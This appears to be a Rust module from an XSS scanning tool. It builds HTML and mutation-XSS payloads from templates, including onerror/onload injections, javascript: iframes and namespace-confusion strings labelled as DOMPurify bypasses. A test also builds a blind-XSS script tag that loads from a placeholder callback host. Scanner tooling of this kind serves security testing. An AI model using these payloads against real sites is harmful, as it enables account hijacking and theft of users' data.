/// Dynamically build HTML payloads by combining base templates with JavaScript execution
/// primitives from XSS_JAVASCRIPT_PAYLOADS.
/// This replaces the previous static XSS_HTML_PAYLOADS constant to ensure automatic synchronization
/// when JavaScript payload list changes.
/// Expose useful HTML tag names commonly leveraged in XSS contexts
pub fn useful_html_tag_names() -> &'static [&'static str] {
    &[
        "script", "img", "svg", "iframe", "math", "xmp", "details", "video", "audio", "object",
        "embed", "marquee", "body", "meta", "link", "input", "form", "textarea", "select",
        "template",
    ]
}

pub fn get_dynamic_xss_html_payloads() -> Vec<String> {
    let templates = [
        // CLASS
        "<IMG src=x onerror={JS} ClAss={CLASS}>",
        "<sVg onload={JS} claSS={CLASS}>",
        "<sCrIpt/cLaSs={CLASS}>{JS}</scRipT>",
        "<xmp><p title=\"</xmp><svg/onload={JS}) class={CLASS}>",
        "<details open ontoggle={JS} class={CLASS}>",
        "<iFrAme/src=JaVAsCrIPt:{JS} ClAss={CLASS}>",
        "</<a/href='><svg/onload={JS} claSS={CLASS}>'>",
        // ID
        "<IMG src=x onerror={JS} id={ID}>",
        "<sVg onload={JS} iD={ID}>",
        "<sCrIpt/ID={ID}>{JS}</scRipT>",
    ];
    let mut out = Vec::new();
    for js in crate::payload::XSS_JAVASCRIPT_PAYLOADS_SMALL.iter() {
        for tmpl in templates.iter() {
            let with_js = tmpl.replace("{JS}", js);
            let with_class = with_js.replace("{CLASS}", crate::scanning::markers::class_marker());
            let with_id = with_class.replace("{ID}", crate::scanning::markers::id_marker());
            out.push(with_id);
        }
    }
    out
}

/// Generate mXSS (mutation XSS) payloads that exploit browser HTML parser quirks
/// such as namespace confusion, innerHTML re-parsing, and DOMPurify bypass patterns.
pub fn get_mxss_payloads() -> Vec<String> {
    let templates = [
        // SVG foreignObject namespace confusion
        "<svg><foreignobject><img src=x onerror={JS} class={CLASS}></foreignobject></svg>",
        "<svg><foreignObject><body onload={JS} class={CLASS}></foreignObject></svg>",
        // Math/mtext namespace confusion
        "<math><mtext><img src=x onerror={JS} class={CLASS}></mtext></math>",
        "<math><mtext><table><mglyph><style><!--</style><img src=x onerror={JS} class={CLASS}>",
        // Noscript/textarea/title innerHTML reparse
        "<noscript><img src=x onerror={JS} class={CLASS}></noscript>",
        // DOMPurify bypass patterns (form-math-mtext chain)
        "<form><math><mtext></form><form><mglyph><svg><mtext><style><img src=x onerror={JS} class={CLASS}>",
        // Template/style-based mutation
        "<svg></p><style><a id=\"</style><img src=x onerror={JS} class={CLASS}>\">",
        // annotation-xml encoding reparse
        "<math><annotation-xml encoding=\"text/html\"><img src=x onerror={JS} class={CLASS}></annotation-xml></math>",
        // SVG desc/title namespace confusion
        "<svg><desc><img src=x onerror={JS} class={CLASS}></desc></svg>",
        // ID variants
        "<svg><foreignobject><img src=x onerror={JS} id={ID}></foreignobject></svg>",
        "<math><mtext><img src=x onerror={JS} id={ID}></mtext></math>",
        "<math><annotation-xml encoding=\"text/html\"><img src=x onerror={JS} id={ID}></annotation-xml></math>",
    ];

    let mut out = Vec::new();
    for js in crate::payload::XSS_JAVASCRIPT_PAYLOADS_SMALL.iter() {
        for tmpl in templates.iter() {
            let with_js = tmpl.replace("{JS}", js);
            let with_class = with_js.replace("{CLASS}", crate::scanning::markers::class_marker());
            let with_id = with_class.replace("{ID}", crate::scanning::markers::id_marker());
            out.push(with_id);
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_get_dynamic_xss_html_payloads_non_empty() {
        let payloads = get_dynamic_xss_html_payloads();
        assert!(!payloads.is_empty());
    }

    #[test]
    fn test_get_dynamic_xss_html_payloads_contains_markers_and_js() {
        let payloads = get_dynamic_xss_html_payloads();
        let cls = crate::scanning::markers::class_marker().to_lowercase();
        let idm = crate::scanning::markers::id_marker().to_lowercase();
        let has_class = payloads
            .iter()
            .any(|p| p.to_lowercase().contains(&format!("class={}", cls)));
        let has_id = payloads
            .iter()
            .any(|p| p.to_lowercase().contains(&format!("id={}", idm)));
        assert!(has_class || has_id, "should contain class/id marker");
        let has_alert = payloads
            .iter()
            .any(|p| p.to_lowercase().contains("alert(1)"));
        assert!(has_alert, "should include at least one alert(1) variant");
    }

    #[test]
    fn test_attribute_payloads_from_event_module() {
        let attrs = crate::payload::get_dynamic_xss_attribute_payloads();
        assert!(!attrs.is_empty(), "attribute payloads should not be empty");
        assert!(attrs.iter().any(|p| p.starts_with("onerror=")));
        assert!(attrs.iter().any(|p| p.starts_with("onload=")));
        assert!(
            attrs.iter().any(|p| p.contains("alert(1)")),
            "should include alert(1) primitive"
        );
    }

    #[test]
    fn test_get_mxss_payloads_non_empty() {
        let payloads = get_mxss_payloads();
        assert!(!payloads.is_empty(), "mXSS payloads should not be empty");
    }

    #[test]
    fn test_get_mxss_payloads_contains_svg_foreignobject() {
        let payloads = get_mxss_payloads();
        assert!(
            payloads.iter().any(|p| p.contains("foreignobject") || p.contains("foreignObject")),
            "should contain SVG foreignObject payloads"
        );
    }

    #[test]
    fn test_get_mxss_payloads_contains_math_mtext() {
        let payloads = get_mxss_payloads();
        assert!(
            payloads.iter().any(|p| p.contains("mtext")),
            "should contain math/mtext payloads"
        );
    }

    #[test]
    fn test_get_mxss_payloads_contains_markers() {
        let payloads = get_mxss_payloads();
        let cls = crate::scanning::markers::class_marker();
        let idm = crate::scanning::markers::id_marker();
        let has_marker = payloads.iter().any(|p| p.contains(cls) || p.contains(idm));
        assert!(has_marker, "mXSS payloads should contain class/id markers");
    }

    #[test]
    fn test_blind_template_placeholder_and_replacement() {
        let tpl = crate::payload::XSS_BLIND_PAYLOADS
            .get(0)
            .copied()
            .unwrap_or("\"'><script src={}></script>");
        assert!(
            tpl.contains("{}"),
            "blind template should include '{{}}' placeholder"
        );
        let replaced = tpl.replace("{}", "https://callback.example/x");
        assert!(
            replaced.contains("https://callback.example/x"),
            "replaced template should include callback URL"
        );
    }
}
